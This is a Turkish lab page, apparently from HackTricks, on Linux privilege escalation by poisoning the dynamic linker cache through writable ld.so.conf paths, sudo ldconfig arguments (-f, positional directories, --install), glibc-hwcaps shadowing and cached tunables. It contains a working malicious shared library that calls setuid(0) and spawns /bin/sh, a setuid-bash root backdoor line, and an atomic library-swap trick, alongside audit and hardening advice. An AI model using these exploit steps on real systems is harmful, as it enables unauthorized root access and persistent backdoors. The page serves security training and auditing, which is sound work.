# ld.so privesc exploit örneği

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **`/etc/ld.so.conf` veya `ldconfig` üzerinden system linker cache poisoning** için hazırlanmış odaklı bir lab'dir. Missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` ve diğer generic SUID linker abuse yöntemleri için [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) sayfasına bakın.

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Bu dosyaları makinenizde aynı klasörde **oluşturun**
2. **Kütüphaneyi** derleyin: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` konumuna **kopyalayın** ve önbelleği yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
4. **Yürütülebilir dosyayı** derleyin: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_ dosyasının _/usr/lib_ konumundan **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Yararlı triage komutları

Gerçek bir hedefe saldırırken, binary'nin ihtiyaç duyduğu **exact library name** bilgisini, loader'ın **currently resolving** durumunu ve canlı cache'i değiştirmeden yapılandırılmış hangi yolların yazılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` aracını yalnızca **güvenilir** bir executable üzerinde kullanın. Bazı implementasyonlar veya alışılmadık ELF interpreter'ları, saldırgan kontrollü kodun çalıştırılmasına neden olabilir; `objdump -p ./file | grep NEEDED` doğrudan bağımlılıkları güvenli şekilde listeler. Güvenilir bir hedef için, tespit edilen interpreter'ı `--list` ile çağırmak gerçek çözümlemeyi gösterir. Bu çıktıyı `--inhibit-cache --list` çıktısıyla karşılaştırın: aradaki fark, nesneyi normal bir search-path kuralı yerine `/etc/ld.so.cache` dosyasının seçtiğini kanıtlar.<sup>[[1]](#references)[[4]](#references)</sup>

Birkaç yararlı ayrıntı:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü yönlendirme mevcut shell'iniz tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** ile çalışır: `LD_LIBRARY_PATH`
yok sayılır; `LD_PRELOAD` ise kısıtlanır (slash içeren adlar yok sayılır ve yalnızca standard dizinlerdeki setuid işaretli library'ler preload edilebilir). Root `ldconfig` çalıştırdığında, `/etc/ld.so.conf` içinde listelenen dizinler `/etc/ld.so.cache` dosyasına eklenebilir; dolayısıyla bu yanlış yapılandırma privileged program'ları yine de etkileyebilir.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG`, `/etc/suid-debug` mevcut olmadıkça secure-execution mode'da yok sayılır. Bu nedenle privileged execution'dan çıktı beklemek yerine trace'i eşdeğer bir non-SUID çalıştırmadan toplayın.<sup>[[1]](#references)</sup>
- glibc 2.33 ve daha yeni sürümlerde dynamic loader ayrıca
`--list-diagnostics` seçeneğini sunar; bu seçenek, bir hijack beklenildiği gibi davranmadığında machine-readable loader diagnostics ve yerleşik search-path bilgilerini yazdırır.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache ve SONAME kısıtlamaları

`ldconfig`, yapılandırılmış bir dizindeki her rastgele dosyayı cache'lemez: ELF header'larını inceler, `lib*.so*` veya `ld-*.so*` ile eşleşen adları tanır ve geleneksel `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` zincirini bekler. Bu nedenle enjekte edilen object, hedef architecture/class'a, tam `DT_NEEDED` adına (genellikle `DT_SONAME`) ve victim'ın çözdüğü tüm symbol/version'lara sahip olmalıdır.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Bu örnekteki gibi hedefe özgü bir library tercih edin. Eksik bir object ile yaygın bir SONAME'i shadowing etmek, hedeflenen privileged işlem çalışmadan önce onu çözen her işlemi bozabilir.<sup>[[3]](#references)</sup>

### Cache path persistence ve atomic swaps

Cache, **library name to pathname** eşlemesini kaydeder; shared object'i içine gömmez. Saldırganın kontrolündeki bir pathname cache'e alındıktan sonra, tam olarak o path'teki object'in değiştirilmesi, başka bir `ldconfig` çalıştırılmasına gerek kalmadan yeni başlatılan işlemleri etkiler. Bu, kullanışlı bir time-of-check/time-of-use modeli sağlar: Yöneticinin cache'i yeniden oluşturması veya incelemesi sırasında geçerli bir library sunun, ardından payload'ı atomic olarak üzerine rename edin. Mevcut işlemler, önceden map edilmiş object'lerini kullanmaya devam eder.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Benzer şekilde, kötü amaçlı satırın `ld.so.conf` dosyasından silinmesi, daha önce yazılmış bir girdiyi kendi başına kaldırmaz: yönetici, güvenilmeyen nesneyi kaldırmalı, sahiplik/yazma erişimini düzeltmeli ve önbelleği yeniden oluşturmalıdır. Hâlâ etkin bir yapılandırma yolunu eski bir önbellek girdisinden ayırt etmek için yukarıdaki `--inhibit-cache` karşılaştırmasını kullanın.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Bu senaryoda, bir yöneticinin sistemin
`/etc/ld.so.conf` dosyası tarafından dahil edilen `/etc/ld.so.conf.d/`
altındaki bir dosyaya güvenlik açığı içeren bir girdi eklediğini varsayalım.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Savunmasız klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu yer).\
Aşağıdaki kodu bu yolun içinde **indirin ve derleyin**:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir ayrıcalıklı hesap) tarafından çalıştırılmasını beklediğiniz bir **vulnerable binary** varsa, genellikle etkileşimli bir shell başlatmak yerine **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı çalıştırma gerçekleştiğinde `/tmp/rootbash -p` komutunu kullanabilirsiniz.

Artık **kötü amaçlı libcustom kütüphanesini yanlış yapılandırılmış** yolun içinde **oluşturduğumuza** göre, varsayılan önbellek başarılı bir ayrıcalıklı **`ldconfig`** çalıştırmasıyla yeniden oluşturulmalıdır. Yeniden başlatma yalnızca yerel önyükleme işlemi gerçekten bunu çağırıyorsa yardımcı olur; aksi takdirde bir yöneticinin işlem yapmasını bekleyin veya mevcutsa güvenli olmayan bir sudo kuralı kullanın.<sup>[[2]](#references)</sup>

Bu gerçekleştiğinde, `sharedvuln` executable'ının `libcustom.so` library'sini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yüklüyor** ve herhangi bir kullanıcı onu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz ayrıcalıkları yükseltmediğimizi unutmayın; ancak yürütülen komutları değiştirip **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi yürütmesini bekleyerek** ayrıcalıkları yükseltebiliriz.

### Modern `glibc-hwcaps` shadowing

glibc 2.33'ten beri loader, **her library search directory** içindeki `glibc-hwcaps/<level>/` altında bulunan optimize edilmiş kütüphaneleri tercih edebilir. Sonuç olarak yalnızca `/home/ubuntu/lib` dizinini kontrol etmek yetersizdir: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` gibi yazılabilir ve uyumlu bir alt dizin, `ldconfig` bu dizini indeksledikten sonra temel kütüphaneyi shadow edebilir; diğer CPU'lar ise temel objeyi kullanmaya devam eder. Bu durum aynı zamanda doğrulama farklı bir CPU üzerinde gerçekleştirildiğinde gözden kaçabilecek, architecture-selective bir hijack sağlar.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mevcut glibc hardening yönergeleri, yinelenen SONAME'lerden, varsayılan olmayan arama konumlarından ve `glibc-hwcaps` alt dizinlerindeki nesnelerden kaçınılmasını önerir. Audit açısından, yapılandırılmış dizinlere ve bunların üst path bileşenlerine sahiplik ve yazılabilirlik kontrollerini recursive olarak uygulayın.<sup>[[3]](#references)</sup>

### Diğer yanlış yapılandırmalar - Aynı vuln

Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir configuration file içine ayrıcalıksız bir klasör tanımladığı** bir yanlış yapılandırmayı taklit ettik.\
Ancak aynı vulnerability'ye neden olabilecek başka yanlış yapılandırmalar da vardır: yüklenen bir **config file** üzerinde **write permissions**'ınız varsa, yazılabilir bir `/etc/ld.so.conf.d/` dizini içinde bir dosya oluşturabiliyorsanız veya `/etc/ld.so.conf` dosyasına yazabiliyorsanız, aynı vulnerability'yi yapılandırabilir ve exploit edebilirsiniz.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` üzerinde sudo privileges'ınız olduğunu varsayalım**. `ldconfig`, scan directory'lerini positional arguments olarak kabul eder; bu nedenle cache-poisoning için en kısa form çoğu zaman yalnızca şudur:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternatif olarak, `-f`, varsayılan önbellek çıktısını korurken başka bir yapılandırma dosyası seçer. Bu, bir argüman filtresinin konumsal dizinleri engellemesine rağmen `-f` seçeneğine izin verdiği veya birden fazla yolun enjekte edilmesi gerektiği durumlarda kullanışlıdır:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki exploit** bölümünde belirtildiği gibi, **kötü amaçlı library'yi `/tmp` içinde oluşturun**.\
Ve son olarak, path'i yükleyelim ve binary'nin library'yi nereden yüklediğini kontrol edelim:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olmak da aynı vulnerability'yi exploit etmenizi sağlar.** Kısıtlı bir sudo kuralını değerlendirirken seçeneklerin ayrıntıları önemlidir: `-f` farklı bir configuration seçer, ancak yine de `/etc/ld.so.cache` dosyasını yeniden oluşturur; `-C` cache'i başka bir konuma yönlendirir; `-N` cache'in yeniden oluşturulmasını engeller; `-X` ise link güncellemelerini engeller, ancak **`-N` ile birlikte kullanılmadığı sürece cache'i yine de yeniden oluşturur**. `-n`, `-N` anlamına gelir; bu nedenle sağlanan dizinlerdeki link'leri güncelleyebilir, ancak cache'i poison edemez; `-r` alternatif bir root altında çalışır ve normalde host cache'ini değiştirmez.<sup>[[2]](#references)</sup>

### glibc 2.44: önceden oluşturulmuş bir cache kurma

Glibc 2.44, önceden oluşturulmuş bir cache'i seçilen cache hedefine atomik olarak kopyalayan `ldconfig --install SOURCE` seçeneğini ekledi (`-C` veya `-r` tarafından değiştirilmediği sürece host `/etc/ld.so.cache`). Bu, sudoers kuralları ve privileged wrapper'lar için başka bir tehlikeli argüman oluşturur: bir attacker **privileges olmadan** geçerli bir cache oluşturabilir, ardından izin verilen `--install` çağrısını kullanarak system cache'i değiştirebilir. Install path, cache magic'ini kontrol eder, ancak girişlerini trusted configuration'dan yeniden oluşturmaz.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Önbellek hâlâ **pathnames** içerir, library byte'larını değil; bu nedenle kurban başlatıldığında `/tmp/libcustom.so` mevcut ve uyumlu olmalıdır. Yalnızca `-f`, positional directories veya `-t` seçeneklerini reddeden filtreler glibc 2.44 üzerinde bu nedenle eksiktir: `--install`/`-I` seçeneklerini de reddedin veya tercihen `ldconfig`'i hiç delegate etmeyin.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached system-wide tunables

glibc 2.44 ile birlikte `ldconfig`, `/etc/tunables.conf` dosyasını da parse eder ve ayarlarını `/etc/ld.so.cache` içine extension olarak kaydeder. Dosya `include` direktiflerini ve per-process filters kabul eder. Prefix'ler kapsamı kontrol eder: `@`/`onlysecure` yalnızca `AT_SECURE` process'lerini hedefler, `$`/`nonsecure` bunları hariç tutar ve `*`/`anysecure` her ikisini de kapsar. **Prefix içermeyen bir entry varsayılan olarak non-secure process'ler için geçerlidir**; bu nedenle bir attacker'ın setuid, setgid veya capability-elevated program'ları etkilemek için açıkça `@` veya `*` kullanması gerekir. Bu durum audit boundary'yi library directories kapsamının ötesine taşır: writable tunables configuration veya included file, privileged cache rebuild sonrasında gelecekteki program startup'larını etkileyebilir.<sup>[[7]](#references)[[9]](#references)</sup>

Aynı release, normal cache'i yazmaya devam ederken alternatif bir tunables file seçen `ldconfig -t TUNCONF` seçeneğini ekler; başka bir option bunu değiştirmediği sürece bu davranış geçerlidir. Bu nedenle yalnızca `-f` seçeneğini engellemeye çalışan wrapper'lar ve sudo rules; `-t`, arbitrary positional directories, `--install` ve cache-output manipulation seçeneklerini de reddetmelidir.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Hedefe özgü ayarlanabilirler

`[proc:PATTERN]` filtresi, aşağıdaki girdileri yalnızca çalıştırılabilir dosyanın tam `/proc/self/exe` yolu (`PATTERN` `/` ile başlıyorsa) veya basename'i eşleştiğinde uygular. Bir filtre, sonraki filtreye, `[]` ifadesine, dosyanın sonuna ya da bir include-file sınırına kadar sürer. Bu, değiştirilmiş davranış tek bir ayrıcalıklı kurbanla sınırlandırılabildiğinden, zehirlenmiş bir cache'in daha az gürültü oluşturmasını sağlar.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
`-`/`nonoverridable` öneki, `GLIBC_TUNABLES` değişkeninin önbelleğe alınmış bir değeri geçersiz kılmasını önler; `+`/`overridable` ise normal override davranışını geri yükler. `AT_SECURE` işlemleri için ortam değişkeni zaten tamamen yok sayılır. Dosya biçimini sürüme özgü kabul edin; glibc bunu kararlı bir arayüz olarak garanti etmez. Hedeflenen bir etkiyi denemeden önce, desteklenen adları ve değerleri `"$interp" --list-tunables` ile listeleyin.<sup>[[7]](#references)[[9]](#references)</sup>

Bu, otomatik olarak arbitrary code execution anlamına gelmez. Bu, ayrıcalıklı bir **loader-behavior manipulation** primitive'idir: glibc, sistem genelindeki değerlerin setuid/setgid programlarına tunable başına güvenlik taraması yapılmadan güvenlik açısından hassas tunable'lar uygulayabileceği konusunda açıkça uyarır. Evrensel bir payload varsaymak yerine hedefe özgü allocator değişikliklerini, CPU-hardening değişikliklerini veya denial-of-service koşullarını araştırın.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
